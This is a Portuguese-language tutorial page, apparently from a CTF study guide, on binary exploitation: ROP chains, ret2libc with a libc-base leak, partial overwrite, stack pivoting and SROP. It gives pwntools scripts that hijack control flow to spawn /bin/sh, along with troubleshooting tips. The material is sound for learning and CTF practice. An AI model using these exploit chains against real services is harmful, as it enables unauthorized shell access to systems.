---
title: "ROP, ret2libc, SROP e Pivoting"
sidebar_position: 6
---

Com **NX** ativo, a stack não executa shellcode. Em vez de injetar código, encadeamos pedaços de código já existentes (**gadgets**), todos terminando em `ret`: cada `ret` pega o próximo endereço da stack, que nós controlamos pelo Buffer Overflow.

## ROP básico (x64)

Argumentos vão em `rdi, rsi, rdx` → precisamos de gadgets `pop rdi; ret` etc. para preenchê-los, e depois o endereço da função.

```
[padding até o return address]
[pop rdi; ret]  [arg1]
[pop rsi; ret]  [arg2]
[função]
[próximo gadget ou função...]
```

```py
from pwn import *
elf = context.binary = ELF('./vuln')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

payload  = b'A' * offset
payload += p64(pop_rdi) + p64(next(elf.search(b'/bin/sh\0')))
payload += p64(ret)                      # alinhamento (veja abaixo)
payload += p64(elf.plt['system'])        # se o binário importa system
```

Ou deixe o pwntools montar: `rop.call('system', [bin_sh]); payload = b'A'*offset + rop.chain()`. `rop.dump()` mostra a chain.

Achar gadgets: `ROPgadget --binary ./vuln | grep "pop rdi"` ou `ropper --file ./vuln --search "pop rdi"`. O `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` da `__libc_csu_init` está em quase todo binário (glibc < 2.34). `pop rdx` costuma só existir na libc.

**Alinhamento**: se der `SIGSEGV` em `movaps` dentro de `system`/`printf`, coloque um gadget `ret` a mais antes da chamada (a stack precisa estar em múltiplo de 16 no `call`, e ao entrar por `ret` ficamos 8 bytes fora).

**x86 (32 bits)**: argumentos vão na stack, sem gadgets: `[função][return address][arg1][arg2]`. Ex: `p32(system) + p32(exit) + p32(bin_sh)`.

## ret2libc

Quando o binário não tem `system` nem `/bin/sh`, usamos os da libc. Precisamos da **base da libc** (ASLR muda a cada execução, mas os offsets dentro da libc são fixos).

Receita em 2 estágios:

```py
from pwn import *
elf = context.binary = ELF('./vuln')
libc = ELF('./libc.so.6')               # a libc do servidor (fornecida pelo desafio; use pwninit para rodar local)
p = process()
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Estágio 1: puts(puts@got) imprime o endereço real de puts, e voltamos para main
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
p.sendlineafter(b'> ', payload)         # ajuste o prompt
leak = u64(p.recvline().strip().ljust(8, b'\0'))
libc.address = leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# Estágio 2: system("/bin/sh")
payload  = b'A' * offset
payload += p64(ret)                      # alinhamento
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\0')))
payload += p64(libc.sym['system'])
p.sendlineafter(b'> ', payload)
p.interactive()
```

Alternativas para o leak: format string (`%p`) com um endereço da libc, leitura fora de array, UAF na heap. Sem a libc do desafio: identifique pela terminação do leak (3 últimos dígitos) em [libc.rip](https://libc.rip). Atalho: `one_gadget libc.so.6` dá endereços que abrem shell sem argumentos (exigem certas condições nos registradores).

Com ASLR **desligado** (local): `ldd ./vuln` dá a base, e `libc.address = base`.

## Partial Overwrite

Com PIE/ASLR, os 12 bits baixos (3 últimos dígitos hex) de qualquer endereço **não mudam** (randomização por página). Se o return address já aponta para dentro do binário (ex: `main+0x5a`) e o alvo está perto (ex: `win`), sobrescreva só o **último byte**:

```py
payload = b'A' * offset + b'\xf6'      # troca ...1da por ...1f6. Use send(), não sendline()
```

2 bytes exigem acertar 1 dígito aleatório: 1 chance em 16, repita o exploit em loop. Precisa que o input não adicione `\n`/`\0` no fim (`read`, não `gets`).

## Stack Pivoting

Quando só cabe o return address e pouco mais, movemos `rsp` para uma região que controlamos (`.bss` sem PIE, heap, ou um buffer maior) onde a chain inteira já está.

O gadget mais comum é `leave; ret` (fim de qualquer função): o `RBP` salvo (logo antes do return address, que o overflow já alcança) vira o novo `rsp`.

```
[padding]
[RBP salvo]      = endereço da nova stack   (ex: elf.bss() + 0x100)
[return address] = gadget leave; ret

Nova stack: [8 bytes de lixo (vira rbp)] [chain ROP...]
```

Para colocar a chain na nova stack antes do pivot, use um mini-ROP com `read(0, bss, 0x200)` (ou `gets(bss)`), ou aproveite um input que o programa já grave lá. `rop.migrate(addr)` do pwntools gera o pivot.

## SROP

Para binários **estáticos e pequenos** (sem libc, sem `pop rdi`), mas com um gadget `syscall; ret`. A syscall `rt_sigreturn` (15) carrega **todos os registradores** a partir de uma struct na stack, que forjamos:

```py
from pwn import *
context.binary = elf = ELF('./vuln')

syscall_ret = 0x401000                   # ROPgadget --binary ./vuln | grep "syscall ; ret"
pop_rax     = 0x401010                   # ROPgadget --binary ./vuln | grep "pop rax ; ret" (se existir)
bin_sh      = 0x402000                   # "/bin/sh" na .data, ou escreva com um read antes

frame = SigreturnFrame()
frame.rax = 59                            # execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload  = b'A' * offset
payload += p64(pop_rax) + p64(15)         # rax = 15 (sigreturn)
payload += p64(syscall_ret)               # chama sigreturn: o kernel lê o frame a seguir
payload += bytes(frame)                   # 248 bytes
p.send(payload)
```

Sem `pop rax`: use o **retorno do `read`**. Faça a chain voltar para um `read(0, buf, N)`, envie exatamente **15 bytes**, e `rax` fica 15; o próximo endereço de retorno é o `syscall; ret`.

Se `/bin/sh` não existe no binário: primeiro frame faz `read(0, .bss, 0x100)` com `rip = syscall_ret` e `rsp` apontando para o resto da chain; envie `/bin/sh\0`; segundo frame faz o `execve`.

## Checklist de problemas

- `SIGSEGV` em `movaps` → alinhamento: adicione/remova um `ret`
- Chain para na metade → algum gadget tem `pop` extra (coloque lixo para cada `pop`) ou a função destrói um registrador que você preparou (`rdx` é comum)
- Funciona local, não remoto → libc diferente (pegue a do servidor, use `pwninit`), ou offset de stack diferente (variáveis de ambiente). Não dependa de endereços de stack absolutos
- Leak vem com 6 bytes → `u64(leak.ljust(8, b'\0'))`
